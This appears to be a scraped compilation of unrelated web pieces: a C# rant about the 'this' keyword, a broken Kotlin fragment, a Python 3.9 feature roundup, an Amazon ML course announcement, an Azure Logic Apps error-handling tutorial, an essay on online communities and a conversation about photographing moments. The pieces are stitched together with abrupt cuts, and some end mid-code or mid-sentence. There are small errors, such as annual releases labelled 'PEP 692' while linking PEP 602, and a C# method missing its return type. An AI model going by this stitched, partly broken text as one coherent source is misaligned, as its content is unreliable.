<p>I've had managers want developers to use <code>this</code> to signify calling a base class's method, which is incorrect. You should be using <code>base</code>.</p>
<pre><code>public class MyClass : YourClass {
    public void MyMethod() {
        if(!base.YourMethod()) return;
    }
}</code></pre>
<p>I've had coworkers who would put <code>this</code> before every method call, because...? When calling your own method, in your own class, that inherits/implements no other classes, why on earth would you decorate your own method call with <code>this</code>?</p>
<p>The only time I have seen prepending <code>this</code> to anything as <em>kind of</em> acceptable, is when you have parameters in a method that are the same as fields/properties on your class, and you need to access those fields/properties inside said method. I am still not a fan of this, but the closest I will get to accepting it is in a constructor where you are passing values that will be stored as <strong>private</strong> fields.</p>
<pre><code>public class SomeClass {
    int maxAmount;
    SomeClass(int maxAmount) =&gt; this.maxAmount = maxAmount;
    ValidateMe(int someValue) =&gt; someValue &lt;= maxAmount;
}</code></pre>
<p>But even in this case, you should really be using Pascal casing as per <a href="https://docs.microsoft.com/en-us/dotnet/standard/design-guidelines/capitalization-conventions">Microsoft's Capitalization Conventions</a>. I know, capitalization conventions change over time, and I could have <strong>sworn</strong> there was a time when camel casing was the recommended approach for fields (specifically private fields), but times they are a changing, and cleaner code will hopefully prevail, especially cleaner code without the misuse/abuse of <code>this</code>.</p>
<p>Maybe I'm the only one this matters for, or maybe I'm just having a bad day and came across <code>this</code> too many times this morning. I do hope you agree though.</p>

The problem is you have never seen a real turtle before. The only thing you know about turtles is that they can swim, have four legs and are reptiles. As you walk into the petstore you see a lot of different species of animals. You decide to write a simple program to determine whether an animal is a turtle or not.</p> <p>The program you write looks something like this:</p> <figure><pre><code data-lang="kotlin"><span>fun</span> <span>isTurtle</span><span>()</span> <span>{</span>

You want to make sure you don’t make any mistake.

Full Presentation Description

The very essence of functional programming relies on a fairly simple premise: write side-effectless programs, so that you can reason about them equationally. Side-effects however are predominant in every program that . . . well, does something useful. In light of this, the modelling of effects in functional programs has become a fairly active domain of study. ...</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
                

<p>As of 2020-08-11, the first release candidate of Python 3.9 <a href="https://www.python.org/downloads/release/python-390rc1/">has been released</a> - officially making it Christmas in August; let’s open presents.</p>



<p><em>Vaguely ordered by ascending excitement.</em></p>

<h2 id="native-dict-unions">Native Dict Unions</h2>

<p><em><a href="https://www.python.org/dev/peps/pep-0584/">PEP 584</a>: Add union operators to dict</em></p>

<p>At the moment, if you want to merge a couple of dicts, the primary methods are to use either <code>{**first_dict, **second_dict}</code> or <code>first_dict.update(second_dict)</code> (which modifies <code>first_dict</code> in-place):</p>


<pre><code>a = {0: 0, 1: 0, 2: 0}
b = {1: 1, 2: 2, 3: 3}

self.assertEqual({**a, **b}, {0: 0, 1: 1, 2: 2, 3: 3})

# `b` is modified in-place
b.update(a) 

self.assertEqual(b, {0: 0, 1: 0, 2: 0, 3: 3})
</code></pre>

<p>The syntax introduced in Python 3.9 is a lot more straightforward, allowing you to merge dicts with a pipe, e.g. <code>first_dict | second_dict</code> or <code>first_dict |= second_dict</code> (which, again, modifies <code>first_dict</code> in-place).</p>

<p>The order of the dicts still matters, i.e. whichever dict comes last will take precedence when there are key collisions.</p>


<pre><code>a = {0: 0, 1: 0, 2: 0}
b = {1: 1, 2: 2, 3: 3}

# `b` colliding keys `1` and `2` still take precedence over `a`
self.assertEqual(a | b, {0: 0, 1: 1, 2: 2, 3: 3})

# `b` is modified in-place
b |= a

# `a` colliding keys `1` and `2` still take precedence over `b`
self.assertEqual(b, {0: 0, 1: 0, 2: 0, 3: 3})
</code></pre>

<h2 id="native-string-pre-suf-fix-removal">Native String (Pre|Suf)fix Removal</h2>

<p><em><a href="https://www.python.org/dev/peps/pep-0616/">PEP 616</a>: String methods to remove prefixes and suffixes</em></p>

<p>It’s hard to overstate how often I need to strip prefixes or suffixes - and doing it in Python has been pretty verbose up to now.</p>


<pre><code># Stripping a prefix
if some_str.startswith(some_prefix):
    some_str = some_str[len(some_prefix):]

# Stripping a suffix
if some_str.endswith(some_suffix):
    some_str = some_str[:-len(some_suffix)]
</code></pre>

<p>Yeah, you can collapse these to one liners, but it’s still ugly as hell - and God forbid you need to do both at the same time.</p>

<p>I’m thrilled that <code>removeprefix</code> and <code>removesuffix</code> are finally available in Python 3.9:</p>


<pre><code># Stripping a prefix
some_str = some_str.removeprefix(some_prefix)

# Stripping a suffix
some_str = some_str.removesuffix(some_suffix)

# What the hell? Let's do both!
some_str = some_str.removeprefix(some_prefix).removesuffix(some_suffix)
</code></pre>

<h2 id="standard-collection-type-annotations">Standard Collection Type Annotations</h2>

<p><em><a href="https://www.python.org/dev/peps/pep-0585/">PEP 585</a>: Type hinting generics in standard collections</em></p>

<p>This is a feature I’ll be using every day. If you use type annotations to a serious extent, you’ll probably be familiar with some version of the following:</p>


<pre><code>from typing import Dict, List, Set

str_dict: Dict[str, str] = {
   "only": "strings",
   "nothing": "else",
}

float_list: List[float] = [1.1, 2.2, 3.3]

int_set: Set[int] = {1, 2, 3}
</code></pre>

<p>To get the benefits of type checking, you either have to import from <code>typing</code> (like above) or import <code>annotations</code> from <code>__future__</code>.</p>

<p>It’s just an import, but it can add up in a large project - especially if you find yourself copying any type-annotated code from one file to another (or, say, from StackOverflow).</p>

<p>With 3.9, things will be a bit cleaner:</p>


<pre><code>str_dict: dict[str, str] = {
   "only": "strings",
   "nothing": "else",
}

float_list: list[float] = [1.1, 2.2, 3.3]

int_set: set[int] = {1, 2, 3}
</code></pre>



<p><em>I’m not not excited.</em></p>

<h2 id="type-annotation-annotations">Type Annotation.. Annotations?</h2>

<p><em><a href="https://www.python.org/dev/peps/pep-0593/">PEP 593</a>: Flexible function and variable annotations</em></p>

<p>As more Python libraries leverage type annotations, there’s value in giving a flexible way to add metadata alongside particular types. This PEP introduces the <code>Annotated</code> construct which takes a type and an arbitrary list of arguments that serve as metadata, e.g.</p>


<pre><code>Annotated[float, ValueRange(42, 420)]
Annotated[int, IsDivisibleBy(4), IsAfraidOfSeven(False)]
Annotated[tuple, MinLen(1), MaxLen(7)]
</code></pre>

<p>To support these annotations, <code>typing.get_type_hints</code> is changing to provide an <code>include_extras</code> kwarg (defaulting to <code>False</code> for backwards compatibility) that indicates whether to return this additional metadata.</p>

<p>I see how this could be a pretty useful PEP for libraries, but I don’t see a use for it in my own work, yet.</p>



<p><em>Not throwing shade or anything. Just don’t see these changing my life very much.</em></p>

<h2 id="pep-615-https-www-python-org-dev-peps-pep-0615-support-for-the-iana-time-zone-database-in-the-standard-library"><strong><a href="https://www.python.org/dev/peps/pep-0615/">PEP 615</a>: Support for the IANA time zone database in the standard library</strong></h2>

<p>This is a PEP that I need to spend more time with to really understand. My ridiculously dumbed-down (due to me, not you) summary is that it introduces a new <code>zoneinfo</code> API that replaces a lot of the functionality that you’d normally want to use <code>pytz</code> for, e.g.</p>


<pre><code>from zoneinfo import ZoneInfo
from datetime import datetime

zone = ZoneInfo("America/Denver")
dt = datetime(2020, 12, 9, 6, tzinfo=zone)
</code></pre>

<h2 id="pep-692-https-www-python-org-dev-peps-pep-0602-annual-release-cycle-for-python"><strong><a href="https://www.python.org/dev/peps/pep-0602/">PEP 692</a>: Annual release cycle for Python</strong></h2>

<p>Python releases once a year now.</p>

<h2 id="pep-617-https-www-python-org-dev-peps-pep-0617-new-peg-parser-for-cpython"><strong><a href="https://www.python.org/dev/peps/pep-0617/">PEP 617</a>: New PEG parser for CPython</strong></h2>

<p>Probably only relevant if you work on CPython or have an interest in compilers.</p>

<p>Amazon makes its machine learning course — Amazon Machine Learning University — free for everyone to access and learn the most in-demand skills. Earlier, the course was only available for the employees of Amazon. But, it has now been made public for anyone to access and learn machine learning skills such as computer vision and natural language processing and analyzing tabular data.</p>



<p>Initially, the tech giant started the Amazon Machine Learning University in 2016 to upskill its employees. Over the years, the course was used by various teams such as Alexa science, Amazon Go, and more, to implement the latest machine learning techniques in their work. The courses are being taught by Amazon ML experts, thereby providing all the necessary skills required for an individual to blaze a trail and deliver promising AI-based solutions.</p>

<p>Currently, only three courses have been hosted on <a href="https://www.youtube.com/channel/UC12LqyqTQYbXatYS9AA7Nuw/playlists" target="_blank" rel="noreferrer noopener">YouTube</a> by Amazon but by the end of the year, they will include nine more courses. And from 2021, all the classes will be available via on-demand video, along with associated coding materials.</p>



<p>The first three courses: <a href="https://www.youtube.com/watch?v=0FXKbEgz-uU&amp;list=PL8P_Z6C4GcuWfAq8Pt6PBYlck4OprHXsw" target="_blank" rel="noreferrer noopener">NLP</a>, <a href="https://www.youtube.com/watch?v=_6CFi2CO2AI&amp;list=PL8P_Z6C4GcuU4knhhCouJujFZ2tTqU-Ta" target="_blank" rel="noreferrer noopener">Computer Vision</a>, <a href="https://www.youtube.com/watch?v=kj-sPC6pai4&amp;list=PL8P_Z6C4GcuVQZCYf_ZnMoIWLLKGx9Mi2" target="_blank" rel="noreferrer noopener">Tabular Data</a>, will cover a wide range topic. As of now, there are more than 67 videos in three courses combined. Amazon will also be updating its machine learning courses for free as technology advances.</p>



<p>The courses are structured in a way that they will help solve business problems in various domains. In addition, the courses incorporate the book <a href="http://d2l.ai/" target="_blank" rel="noreferrer noopener">Dive into Deep Learning</a> authored by Amazon scientists.&nbsp;</p>



<p>“We want to make sure we’re teaching the important things up front and that we’re making good use of students’ time,” he says. “With the transition to working from home, it’s even harder now for class participants to set aside multiple hours of time. We want to be flexible in how people can take these classes.” Brent Werness, AWS research scientist.</p>

<p>Hi All! Today I just wanted to take a break from the <a href="https://www.davideguida.com/blazor-and-2d-game-development-part-1-intro/" target="_blank" rel="noreferrer noopener">Blazor Gamedev series</a> and talk a bit about Azure. Specifically about <strong>Logic Apps</strong> and how to handle <strong>failures </strong>gracefully.</p>



<p>For those of you who don’t know what a <strong>Logic App</strong> is, I would strongly recommend to take a look at this video first:</p>







<p>Nice isn’t it? In a nutshell, an <strong>Azure Logic App</strong> allows the visual creation of fairly complex workflows and integration between different systems. It all starts with a trigger, which might be a message in a queue or an HTTP call or whatever. Then we have the possibility to drag’n’drop’n’configure all the different Action blocks that will build up our nice workflow. </p>



<h2>And in case we need something more complex, we can always write a Function and include it.</h2>



<p>Let’s do an example. Imagine you want to react to an HTTP call, fetch some data from a DB, manipulate it, and give back a 200 response. The workflow would look more or less like this:</p>



<div><figure><a href="https://i2.wp.com/www.davideguida.com/wp-content/uploads/2020/08/first_run_failure-1.png?ssl=1"><img loading="lazy" width="752" height="395" src="https://i2.wp.com/www.davideguida.com/wp-content/uploads/2020/08/first_run_failure-1.png?resize=752%2C395&amp;ssl=1" alt="" srcset="https://i2.wp.com/www.davideguida.com/wp-content/uploads/2020/08/first_run_failure-1.png?w=1003&amp;ssl=1 1003w, https://i2.wp.com/www.davideguida.com/wp-content/uploads/2020/08/first_run_failure-1.png?resize=300%2C158&amp;ssl=1 300w, https://i2.wp.com/www.davideguida.com/wp-content/uploads/2020/08/first_run_failure-1.png?resize=768%2C404&amp;ssl=1 768w" sizes="(max-width: 752px) 100vw, 752px" data-recalc-dims="1"></a></figure></div>



<p>But wait! Something bad happened when we were trying to get the entity from the DB. Now our callers won’t get a 200 back! How can we handle this? </p>



<p>The first step is to simply split the execution in two branches after the DB node:</p>



<div><figure><a href="https://i1.wp.com/www.davideguida.com/wp-content/uploads/2020/08/result_with_conditional.png?ssl=1"><img loading="lazy" width="752" height="202" src="https://i1.wp.com/www.davideguida.com/wp-content/uploads/2020/08/result_with_conditional.png?resize=752%2C202&amp;ssl=1" alt="" srcset="https://i1.wp.com/www.davideguida.com/wp-content/uploads/2020/08/result_with_conditional.png?resize=1024%2C275&amp;ssl=1 1024w, https://i1.wp.com/www.davideguida.com/wp-content/uploads/2020/08/result_with_conditional.png?resize=300%2C81&amp;ssl=1 300w, https://i1.wp.com/www.davideguida.com/wp-content/uploads/2020/08/result_with_conditional.png?resize=768%2C206&amp;ssl=1 768w, https://i1.wp.com/www.davideguida.com/wp-content/uploads/2020/08/result_with_conditional.png?resize=1536%2C413&amp;ssl=1 1536w, https://i1.wp.com/www.davideguida.com/wp-content/uploads/2020/08/result_with_conditional.png?w=1983&amp;ssl=1 1983w" sizes="(max-width: 752px) 100vw, 752px" data-recalc-dims="1"></a></figure></div>



<p>And then configure the left branch to execute only when an error occurs. This can be done very easily by expanding the node, clicking on the 3 dots and clicking on “Configure run after”:</p>



<figure><img loading="lazy" width="752" height="272" src="https://i2.wp.com/www.davideguida.com/wp-content/uploads/2020/08/configure-run-after.png?resize=752%2C272&amp;ssl=1" alt="" srcset="https://i2.wp.com/www.davideguida.com/wp-content/uploads/2020/08/configure-run-after.png?resize=1024%2C370&amp;ssl=1 1024w, https://i2.wp.com/www.davideguida.com/wp-content/uploads/2020/08/configure-run-after.png?resize=300%2C108&amp;ssl=1 300w, https://i2.wp.com/www.davideguida.com/wp-content/uploads/2020/08/configure-run-after.png?resize=768%2C277&amp;ssl=1 768w, https://i2.wp.com/www.davideguida.com/wp-content/uploads/2020/08/configure-run-after.png?w=1232&amp;ssl=1 1232w" sizes="(max-width: 752px) 100vw, 752px" data-recalc-dims="1"></figure>



<p>Now all we have to do is select under which the conditions we want our branch to execute:</p>



<div><figure><a href="https://i2.wp.com/www.davideguida.com/wp-content/uploads/2020/08/configure-run-after-2.png?ssl=1"><img loading="lazy" width="752" height="328" src="https://i2.wp.com/www.davideguida.com/wp-content/uploads/2020/08/configure-run-after-2.png?resize=752%2C328&amp;ssl=1" alt="" srcset="https://i2.wp.com/www.davideguida.com/wp-content/uploads/2020/08/configure-run-after-2.png?w=948&amp;ssl=1 948w, https://i2.wp.com/www.davideguida.com/wp-content/uploads/2020/08/configure-run-after-2.png?resize=300%2C131&amp;ssl=1 300w, https://i2.wp.com/www.davideguida.com/wp-content/uploads/2020/08/configure-run-after-2.png?resize=768%2C335&amp;ssl=1 768w" sizes="(max-width: 752px) 100vw, 752px" data-recalc-dims="1"></a></figure></div>



<p>That’s it, nothing else. The <em>Terminate</em> node will allow us to select what return value we want to give the users and how the App execution will appear in the execution history (for example as “failed” or “successful”).</p>



<p>In case you also want some details about <em>why<strong> </strong></em>the DB block failed, there’s a bit more work to do. Let’s take a look at the blocks:</p>



<div><figure><img loading="lazy" width="752" height="391" src="https://i2.wp.com/www.davideguida.com/wp-content/uploads/2020/08/scope-result.png?resize=752%2C391&amp;ssl=1" alt="" srcset="https://i2.wp.com/www.davideguida.com/wp-content/uploads/2020/08/scope-result.png?resize=1024%2C533&amp;ssl=1 1024w, https://i2.wp.com/www.davideguida.com/wp-content/uploads/2020/08/scope-result.png?resize=300%2C156&amp;ssl=1 300w, https://i2.wp.com/www.davideguida.com/wp-content/uploads/2020/08/scope-result.png?resize=768%2C400&amp;ssl=1 768w, https://i2.wp.com/www.davideguida.com/wp-content/uploads/2020/08/scope-result.png?resize=1536%2C800&amp;ssl=1 1536w, https://i2.wp.com/www.davideguida.com/wp-content/uploads/2020/08/scope-result.png?w=1850&amp;ssl=1 1850w" sizes="(max-width: 752px) 100vw, 752px" data-recalc-dims="1"></figure></div>



<p>We can’t redirect the error result straight away to our Queue block, but we have to <em>extract</em> from the response payload of the DB block. One way to do this is to surround it with a <em>Scope</em><strong> </strong>block and then Compose the output before redirecting to the Queue. For more details about how the Compose Action works, there’s an <a href="https://docs.microsoft.com/en-us/azure/logic-apps/logic-apps-perform-data-operations#compose-action" target="_blank" rel="noreferrer noopener">awesome page</a> in the official docs. Simply stated, it allows us to aggregate and compose (aehm…) the result from various blocks into whatever form we need.</p>



<p>In our case all we need is something like this:</p>



<div><figure><a href="https://i1.wp.com/www.davideguida.com/wp-content/uploads/2020/08/scope-result-2.png?ssl=1"><img loading="lazy" width="752" height="242" src="https://i1.wp.com/www.davideguida.com/wp-content/uploads/2020/08/scope-result-2.png?resize=752%2C242&amp;ssl=1" alt="" srcset="https://i1.wp.com/www.davideguida.com/wp-content/uploads/2020/08/scope-result-2.png?resize=1024%2C329&amp;ssl=1 1024w, https://i1.wp.com/www.davideguida.com/wp-content/uploads/2020/08/scope-result-2.png?resize=300%2C96&amp;ssl=1 300w, https://i1.wp.com/www.davideguida.com/wp-content/uploads/2020/08/scope-result-2.png?resize=768%2C247&amp;ssl=1 768w, https://i1.wp.com/www.davideguida.com/wp-content/uploads/2020/08/scope-result-2.png?w=1166&amp;ssl=1 1166w" sizes="(max-width: 752px) 100vw, 752px" data-recalc-dims="1"></a></figure></div>



<p>You might also have noticed that I changed the original flow to return a 202 immediately after the Trigger. This will allow the App to execute any long-running operation we need without keeping the caller waiting for us.</p>

<p>People <em>loved </em>Startup Weekend – especially in the days before the Techstars acquisition. And yes, some notable companies like Zaarly, Beardbrand, and Zapier were started at a Startup Weekend…but people didn’t love Startup Weekend for the “companies” that were started there.</p>
<p>People loved Started Weekend for the community.</p>

<p>And I loved what it felt like to create that space for people. So I kept creating community: from organizing Startup Weekends in the early 2010s to throwing house concerts in 2014-2016.</p>
<p>Then in 2017, I started an online accelerator program, Unreal Collective. That program gave rise to its own online community and <a href="https://unrealcollective.com/community">it’s my favorite place</a> to spend time online.</p>
<p>And that all led to this year, when I was given the opportunity to work with Pat Flynn and the Smart Passive Income team to create their paid, online membership community, <a href="https://www.smartpassiveincome.com/pro">SPI Pro</a>, using <a href="https://jayclouse.com/circle" target="_blank" rel="noopener noreferrer">Circle</a> (more about that <a href="https://www.smartpassiveincome.com/podcasts/taking-business-next-level-spi-pro/">on SPI episode 429</a>).</p>

<p>This opportunity to build an online community from the ground up gave me the excuse to really study what it means to build community (both online and offline) and validate a lot of my own assumptions.</p>
<p>And tl;dr: I’m all in on <a href="https://jayclouse.com/circle" target="_blank" rel="noopener noreferrer">Circle</a>, and I’ll explain why below.</p>
<p>But before I can share all the lessons learned, we need to start from the beginning.</p>

<h2>What is community?<span></span></h2>
<p>Community means a lot of different things to different people. To me, community is a group of people with commonality – shared interests, values, or beliefs.</p>
<p>With Startup Weekend, we all shared an interest in technology, but we also shared values like ambition, kindness, and generosity too.</p>
<p>At any given Startup Weekend event, I knew I’d leave with some new, lifelong friendships. And the connection I felt with other people at a Startup Weekend is what made that community so special.</p>
<p>In fact, connection is what makes <em>any </em>community special.</p>
<p>I believe people are drawn to community for three core reasons:</p>
<ol>
<li>Human connection</li>
<li>Transformation</li>
<li>Finding a sense of identity</li>
</ol>
<p>Let’s break each of those down.</p>
<h3>Human connection</h3>
<p>The experience of community goes back to the beginning of humans. We’re a social species and we relied on cooperation to survive.</p>
<p>Community was built into our lives when we lived in a tribal setting. Our community was the people we lived around day in and day out – the people we hunted and gathered with!</p>
<p>We felt that we <strong>belonged </strong>to that tribe. And there’s a lot of comfort in belonging.</p>
<p>As civilization evolved, humans became more socially isolated. Forget about living in tribes – we want to move out of our parents’ house and into our own studio apartments as quickly as we can!</p>
<p>But our brains haven’t actually evolved past that desire for close social connections – our lifestyle has. Our cultural expectations have.</p>
<p>And so we seek out that missing human, social connection elsewhere. We seek out that sense of belonging that we’re missing.</p>
<p>We seek out community.</p>
<h4>Connection through shared experience</h4>
<p>Often, one of the easiest ways to find connection is through shared experience. When we share an experience together, whether it’s a tailgate, an escape room, or starting at a new school, we start from a known commonality.</p>
<p>Commonalities give humans something to talk about and bond over. It’s that shared experience that starts conversation, creates a relationship, and ultimately makes us feel connected to one another.</p>
<h3>Transformation</h3>
<p>We also look to other humans to help us grow.</p>
<p>And when we’re looking to make a change, there are communities there to help.</p>
<p>A great example here is the Crossfit or any fitness-based community. When you join a fitness community, you’re seeking very tangible, physical transformation.</p>
<p>Physical transformations (gaining muscle, losing weight) are easy to recognize in ourselves. We seek out psychological and knowledge transformations too – though they may be a little little harder to recognize.</p>
<p>But when you join a coding bootcamp and leave being able to build a web app, you see the transformation.</p>

<h3>A sense of identity</h3>
<p>Most of us are in a constant battle to understand ourselves. With social media and comparison traps around us all the time, a lot of us have a hard time really knowing who we are and what we care about.</p>
<p>When you ask someone to introduce themselves, they’ll probably launch right into their work. “I’m [position] at [company].”</p>
<p>Our work shouldn’t define our identity – but it gives us something to tether ourselves to when we don’t have a better sense of who we are.</p>
<p>Community provides an alternative.</p>
<p>When someone joins a community, connects with others or experiences transformation, they learn something about themselves. They learn more about their own interests, and those interests may be stronger than their day-to-day work.</p>
<p>That’s why we see so many people identify with Crossfit or Yoga or even volunteering for a nonprofit.</p>

<h4>Finding identity in a movement</h4>
<p>Sometimes, community offers us the opportunity to identify with an idea bigger than ourselves. These communities go beyond shared values and actually call their community members to action.</p>
<p>These communities become a movement. People join a movement because they want to see change, and every member of the community powering a movement has the same shared goal.</p>
<p>When we are part of a movement, we feel that same belonging and connection of other communities, but may even begin to identify with that movement.</p>
<p>And, of course, the best movements exist to create change (transformation) too.</p>
<p>So, any way you slice it, the most thriving communities help us find connection, facilitate transformation, or help us to better understand ourselves and our identity.</p>
<h2>Building community in real life<span></span></h2>
<p>We’ve been part of communities throughout our whole lives. Your graduating class, the clubs you joined in high school or college, your college dorm, local meetup groups…</p>
<p>Any group that you’ve belonged to through shared interests or shared experience is, on some level, a community.</p>
<p>A graduating class is a social cohort with a shared goal: complete your courses, graduate on time. You have the shared experience of joining that cohort at the same time, and you’re pursuing the same transformation: becoming a graduate.</p>
<p>Meetup groups are built around shared interests like painting, anime, yoga, or anything else. We go to these meetups because we feel like we belong there.</p>
<p>We’ve gotten <em>really good </em>at creating in person, analog communities – we’ve had all of evolutionary history to figure it out!</p>
<p>As long as we have a reason for gathering people into a common space, it’s easy to convey that reason and create a sense of belonging.</p>

<p>But analog community is much easier than digital community, because <strong>physical space creates discomfort</strong>. When we show up to a space and may not immediately recognize anyone, we’re filled with equal parts fear and excitement.</p>
<p>We’re afraid to be alone. We’re afraid that the group will decide that we don’t belong. But at the same time, we’re eager for connection.</p>
<p>And that discomfort creates a healthy tension that we often solve by walking up to someone, extending our hand, and saying, “Hi, I’m Jay.”</p>
<p>That’s the magic of physical space. If we show up, we will usually push through the discomfort of feeling like we don’t belong until we feel like we do.</p>
<p>After all, it’s equally embarrassing to walk right back out the door in front of everyone. People who we may see again in our local community!</p>
<p>And in great communities, existing members will notice anyone feeling that discomfort and welcome them in.</p>
<h2><span id="why-many-online-communities-fail"></span>Why many online communities fail<span></span></h2>
<p>On its face, it seems like it should be easy to translate analog communities into digital communities. And even better, because they’re digital, they can scale! You don’t <em>need </em>to be in the same city to connect over your shared love of <em>Hamilton</em>.</p>
<p>But, very quickly, most online communities fall flat.</p>
<h3>The wrong motivation for building your online community</h3>
<p>Many online communities are started purely for selfish reasons. The creator thinks of it as purely an effort to build their audience.</p>
<p><em>If I create a community, it will self-govern, people will invite others in, and my brand will be at the center of their universe.</em></p>
<p>When creators follow <em>this </em>logic – when the online community is built to serve the creator – it’s doomed from the start.</p>
<p>Community has to be about serving people. If you aren’t serving people – if people aren’t finding connection, transformation, or identity within the space – then it will fail.</p>
<p>And any community managers will tell you, fostering online community is a LOT of time and a LOT of work.</p>
<p>If you aren’t planning to dedicate a huge amount of time and resources from the beginning…if you believe that the community will be so emergent that it will self-govern and thrive from day one, you’re wasting your time.</p>
<h3>Lack of intention in building your online community</h3>
<p>In the analog world, if we have a reason for gathering and a space to gather in, the hardest part is just bringing people into that space.</p>
<p>Because as I shared before, the discomfort of feeling like an outsider in a physical space will propel us into connecting with people until we no longer feel like an outsider.</p>
<p>So in the world of online communities, we overestimate the power of the platform. Tools like Discord, Discourse, Slack, Mighty Networks, and Facebook Groups all promise to give you the ROOM to gather your online community.</p>
<p>So creators pick their favorite tool and create an account.</p>
<p>Sometimes the creators of these communities do a really good job of configuring that digital space with specific channels and spaces for specific causes too.</p>
<p>In theory, that’s great! Of course a thriving online community would utilize all of these specific spaces so that they could have even more confidence that <em>this </em>area is …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="bsf_rt_marker"><h2>A conversation about time, identity and Instagram</h2><p><em>This essay started in the Twitter DMs, with a question by <a rel="noreferrer noopener nofollow" href="https://adamtank.com/" target="_blank">Adam Tank</a>, a fellow <a rel="noreferrer noopener nofollow" href="https://writeofpassage.school/" target="_blank">Write of Passage</a> alum, leader of our little writers’ band and convener of our weekend writing sessions. Adam’s question sparked a fun conversation that we decided to capture in an essay that’s special in two ways. One, it’s my first co-created essay (but Adam’s <a rel="noreferrer noopener nofollow" href="https://www.adamtank.com/new-blog/2020/4/30/the-cost-of-writing-well" target="_blank">second</a>), and two, we framed it as a conversation, in honour of the ancient Greek philosophers and modern rappers! (<a rel="noreferrer noopener nofollow" href="https://twitter.com/artank" target="_blank">Follow Adam</a> on Twitter—he’s fun!)</em></p><hr><p><strong>Adam: </strong>A friend of mine recently posted this photo to her Instagram timeline—a sign handcrafted by her father to announce her “unplugged wedding.”</p><p>She’s encouraging wedding guests to be present and enjoy the moment rather than being caught up in taking photos. It’s clear that she values presentness over capture. But when asked if she planned to have a professional photographer at the wedding she enthusiastically responded “Yes! And a videographer!”&nbsp;</p><p>In this example, the distinction of being present in a moment vs. capturing it is particularly intriguing. There is value in being present, as she suggests with the unplugged wedding. But there is also value in capturing the moment, as she plans to hire a photographer and videographer. So one of the questions I’m now asking myself is if it’s wrong to want to capture a moment? Would it be wrong to sneak a cell phone picture in at her wedding?&nbsp;</p><p>I think about how fortunate we are to have camera technology at our fingertips that our ancestors could have only dreamed of. Imagine seeing your child getting married and thinking, “If only I could live in this moment forever”, and not being able to have a photograph of the moment.&nbsp;</p><div><p><strong>Ayomide:</strong>&nbsp;I actually don’t think the issue is that we try to capture moments. I think it’s&nbsp;<em>how</em>&nbsp;we do that which trips us up. Memory itself is a form of capture, right? So is journaling, which humans have done since writing was invented. And even before that was painting, used by unknown people who turned cave walls into their canvas for capturing hunts. And let’s face it, so is every love song, every poem about heartbreak, and every ballad about some hero. Capturing moments that mean something to us is part and parcel of what it means to be human.</p><p><strong>Adam:&nbsp;</strong>That’s true—humans have been capturing moments forever; it’s just the means and technology that’s changed. It’s only been recently (in the last few hundred years) that we’ve had cameras, and only in the last 20 years were cameras integrated into cell phones. The “how” of how we’re capturing moments has changed dramatically in a very short amount of time.</p></div><p><strong>Ayomide:&nbsp;</strong>When I think about what has mainly changed in how we capture, and compare the majority of human history with just the twenty years of the 21st century, the word that comes to my mind is&nbsp;<em>asynchronous</em>. Thanks to powerful computers that let us act at the speed of thought, we have moved from asynchronous to synchronous capture.&nbsp;</p><p>But there’s two problems with that. One is that thought often needs some time to be processed before it can be transformed into meaningful narrative and action. The other is that the very act of observing what we are thinking about changes the thought. The&nbsp;<a href="https://en.wikipedia.org/wiki/Observer_effect_(physics)" target="_blank" rel="noreferrer noopener nofollow">observer effect</a>&nbsp;in physics comes to mind: the idea that the very act of observing something changes it. Here it would be that our attempt to capture a moment&nbsp;<em>in the moment</em>&nbsp;may well kill that very moment.&nbsp;<strong>In promising us instant capture tech has taken away being present.</strong></p><p><strong>Adam:&nbsp;</strong>I&nbsp;<em>love</em>&nbsp;that line. The tradeoff between capture and presentness has become far more dramatic because of advances in technology. I’ve had this photo in my Twitter header for a couple of years and it perfectly distills the essence of what we’re talking about:&nbsp;<img data-src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F7ac35625-8910-4ef1-9e0d-01d9979ddb9e_1500x500.png" alt="" data-old-src="image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F7ac35625-8910-4ef1-9e0d-01d9979ddb9e_1500x500.png"></p><p>This tradeoff, the old lady’s presentness vs. the swarm of younger, technologically enabled capturers is so beautifully apparent. If I think about moments of my childhood that were captured in photographs, my parents were attempting to capture a single, fleeting moment in time. My first steps, the birth of my sister, graduating high school… all of these are naturally occurring, singular moments in time that cannot be replicated.&nbsp;</p><p>But the proliferation of cell phone cameras has flipped the idea of capturing a moment on its head.&nbsp;<strong>People now&nbsp;</strong><em><strong>create</strong></em><strong>&nbsp;moments in order to capture them</strong>—literally doing it for the ’gram. The present is viewed through the lens of a manufactured future—what can I create&nbsp;<em>now</em>&nbsp;so that I can share with others&nbsp;<em>later</em>—which defeats the purpose of the present! You can’t be present if you’re always in the future.</p><p><strong>Ayomide</strong>: Exactly, and some would suggest what appears the obvious solution: that we should simply be in the moment, instead of trying to capture it. But why choose? Why not, as I like to ask with questions like this, try for both? From that angle, one way to get around the synchronicity issue would be to have someone else capture the moment while we experience it. Let’s call this person a&nbsp;<strong>Designated Capturer</strong>: just like having a designated driver means you can drink without having to worry about driving, a designated capturer would let you both experience the moment&nbsp;<em>and</em>&nbsp;faithfully capture it.&nbsp;</p><p><em>Basically you’re shifting the asynchronicity to another person rather than another time.</em>&nbsp;And your friend (like many others) seems to have intuitively realised this. That suggests the designated capturer is not a new concept, just an unnamed one, and understandably given the newness of this tech. And speaking of naming things, that itself is a form of capturing—to name a thing is to increase our awareness of it, make it more real.</p><p><strong>Adam:</strong>&nbsp;A professional photographer really serves two purposes. The first, the obvious, is that a photographer can capture a moment in a way that an amateur cannot. By framing a scene, shooting from various angles, considering the importance of lighting, and using top tier equipment, the professional can tell a story about a moment that will make you&nbsp;<em>feel</em>&nbsp;like you were there and evoke emotion within you.&nbsp;</p><p>The second, and less obvious, is that a designated capturer can free you to be present in a given moment.&nbsp;<strong>By hiring a professional, you no longer have the 